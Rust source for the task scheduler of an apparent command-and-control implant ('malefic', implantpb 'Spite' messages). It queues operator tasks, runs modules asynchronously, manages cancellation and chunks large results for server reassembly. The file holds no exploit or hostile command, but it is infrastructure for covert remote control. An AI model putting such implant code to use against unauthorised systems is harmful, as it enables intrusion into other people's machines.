pub mod collector;
mod task;

pub use malefic_cron::Cronner;

use futures::channel::mpsc::{self, UnboundedReceiver, UnboundedSender};
use futures::{select, FutureExt};
use futures::{SinkExt, StreamExt};
use futures_timer::Delay;
use prost::Message;
use std::sync::{Arc, Mutex};
use std::time::Duration;

use malefic_common::debug;
use malefic_common::spawn;
use malefic_config;
use malefic_module::{MaleficModule, TaskResult};
use malefic_proto::new_spite;
use malefic_proto::proto::implantpb::spite::Body;
use malefic_proto::proto::implantpb::Spite;
use malefic_proto::proto::modulepb::Block;
use task::{Task, TaskHandle, TaskManager};

/// Marker name to distinguish auto-chunked Blocks from module-originated Blocks.
const CHUNK_MARKER: &str = "__chunked__";

/// Send a Spite, auto-chunking if it exceeds the configured max_packet_length.
///
/// Large Spites are split into multiple Spites with Body::Block,
/// marked with name="__chunked__" for server-side reassembly.
/// If max_packet_length is 0 (unconfigured), chunking is disabled.
async fn send_spite_chunked(sender: &mut UnboundedSender<Spite>, spite: Spite) {
    let max_size = *malefic_config::MAX_PACKET_LENGTH;
    if max_size == 0 {
        // Chunking disabled
        let _ = sender.send(spite).await;
        return;
    }

    // Leave 20% headroom for encryption + compression + frame overhead
    let threshold = max_size * 4 / 5;
    let encoded_len = spite.encoded_len();
    if encoded_len <= threshold {
        let _ = sender.send(spite).await;
        return;
    }

    // Serialize the entire Spite to bytes, then chunk the raw bytes.
    // Server reassembles by concatenating chunks and decoding back to Spite.
    let mut spite_bytes = Vec::with_capacity(encoded_len);
    if spite.encode(&mut spite_bytes).is_err() {
        // Fallback: send as-is and hope for the best
        let _ = sender.send(spite).await;
        return;
    }

    let task_id = spite.task_id;
    let status = spite.status.clone();
    let chunk_size = threshold.saturating_sub(200); // leave room for Block wrapper + headers
    let total_chunks = (spite_bytes.len() + chunk_size - 1) / chunk_size;

    for (i, chunk) in spite_bytes.chunks(chunk_size).enumerate() {
        let is_last = i == total_chunks - 1;
        let block_spite = Spite {
            task_id,
            name: CHUNK_MARKER.to_string(),
            r#async: true,
            body: Some(Body::Block(Block {
                block_id: i as u32,
                content: chunk.to_vec(),
                end: is_last,
            })),
            status: if is_last { status.clone() } else { None },
            ..Default::default()
        };
        let _ = sender.send(block_spite).await;
    }
    debug!(
        "[chunked] task {} split into {} chunks ({} bytes)",
        task_id, total_chunks, encoded_len
    );
}

pub enum TaskOperator {
    CancelTask(u32),
    FinishTask(u32),
    QueryTask(u32),
    ListTask,
}

pub struct Scheduler {
    manager: TaskManager,
    task_sender: UnboundedSender<(bool, u32, Box<MaleficModule>, Body)>,
    task_receiver: UnboundedReceiver<(bool, u32, Box<MaleficModule>, Body)>,
    _result_sender: UnboundedSender<TaskResult>,
    result_receiver: UnboundedReceiver<TaskResult>,
    ctrl_sender: UnboundedSender<(u32, TaskOperator)>,
    ctrl_receiver: UnboundedReceiver<(u32, TaskOperator)>,
    data_sender: UnboundedSender<Spite>,
}

impl Scheduler {
    pub fn new(collector_data_sender: UnboundedSender<Spite>) -> Scheduler {
        let (_result_sender, result_receiver) = mpsc::unbounded();
        let (task_sender, task_receiver) = mpsc::unbounded();
        let (task_ctrl_sender, task_ctrl_receiver) = mpsc::unbounded();
        Scheduler {
            manager: TaskManager::new(),
            task_sender,
            task_receiver,
            _result_sender,
            result_receiver,
            ctrl_sender: task_ctrl_sender,
            ctrl_receiver: task_ctrl_receiver,
            data_sender: collector_data_sender,
        }
    }

    pub fn get_task_sender(&self) -> UnboundedSender<(bool, u32, Box<MaleficModule>, Body)> {
        self.task_sender.clone()
    }

    pub fn get_task_ctrl_sender(&self) -> UnboundedSender<(u32, TaskOperator)> {
        self.ctrl_sender.clone()
    }

    pub async fn run(&mut self) -> Result<(), ()> {
        #[cfg(debug_assertions)]
        let _defer = malefic_common::errors::Defer::new("[scheduler] scheduler exit!");

        loop {
            select! {
                task_recv = self.task_receiver.next().fuse() => {
                    if let Some((is_async, id, module, body)) = task_recv {
                        if let Some(task_handle) = self.manager.tasks.get_mut(&id) {
                            if let Ok(mut task) = task_handle.task.lock() {
                                task.update_last();
                                task.recv_count += 1;
                                if task_handle.sender.send(body).await.is_ok() {
                                    debug!("[task] task {} send data", id);
                                    continue;
                                }
                            }
                        } else {
                            self.handle_task(is_async, id, module, body).await;
                        }
                    }
                },
                result_recv = self.result_receiver.next().fuse() => {
                    if let Some(result) = result_recv {
                        debug!("Scheduler receiver result: {:#?}", result);
                        send_spite_chunked(&mut self.data_sender, new_spite(result.task_id, String::new(), result.body)).await;
                    }
                },
                ctrl_recv = self.ctrl_receiver.next().fuse() => {
                    if let Some((tid, op)) = ctrl_recv {
                        match self.manager.do_operator(tid, op).await {
                            Ok(spite) => {
                                if let Some(spite) = spite {
                                    let _ = self.data_sender.send(spite).await;
                                }
                            },
                            Err(_e) => {
                                debug!("Scheduler do_operator error: {}", _e.to_string());
                            }
                        }
                    }
                }
            }
            Delay::new(Duration::from_nanos(1)).await;
        }
    }

    async fn handle_task(
        &mut self,
        _is_async: bool,
        id: u32,
        module: Box<MaleficModule>,
        body: Body,
    ) {
        let (task_data_sender, mut task_data_receiver) = mpsc::unbounded();
        let mut async_sender = self.data_sender.clone();
        let mut end_sender = self.get_task_ctrl_sender().clone();

        let handle = spawn(async move {
            let (mut body_sender, mut body_receiver) = mpsc::unbounded();
            let (mut result_sender, mut result_receiver) = mpsc::unbounded::<TaskResult>();

            let task = Arc::new(Mutex::new(Task::new(id)));
            let task_output = task.clone();
            let output_stream = spawn(async move {
                while let Some(result) = result_receiver.next().await {
                    if let Ok(mut task) = task_output.lock() {
                        task.send_count += 1;
                        task.update_last();
                    }
                    send_spite_chunked(&mut async_sender, result.to_spite()).await;
                }
            });

            let input_stream = spawn(async move {
                let _ = body_sender.send(body).await;
                while let Some(body) = task_data_receiver.next().await {
                    let _ = body_sender.send(body).await;
                }
            });

            let task_handle = Task::run(id, module, &mut body_receiver, &mut result_sender);

            select! {
                _ = input_stream.fuse() => {
                    debug!("[task] input_stream finished");
                }
                data = task_handle.fuse() => {
                    debug!("[task] task_handle finished");
                    match data {
                        Ok(result) => {
                            let _ = result_sender.send(result).await;
                        },
                        Err(e) => {
                            debug!("[task] {} error, {:#?}", id, e);
                            let _ = result_sender.send(TaskResult::new_with_error(id, e.into())).await;
                        }
                    }
                }
            }
            drop(result_sender);
            let _ = output_stream.await;
            let _ = end_sender.send((0, TaskOperator::FinishTask(id))).await;
            debug!("[task] ending!");
        });

        let task = Arc::new(Mutex::new(Task::new(id)));
        self.manager.tasks.insert(
            id,
            TaskHandle {
                task,
                handle: Arc::new(Mutex::new(Some(handle))),
                sender: task_data_sender,
            },
        );
    }
}
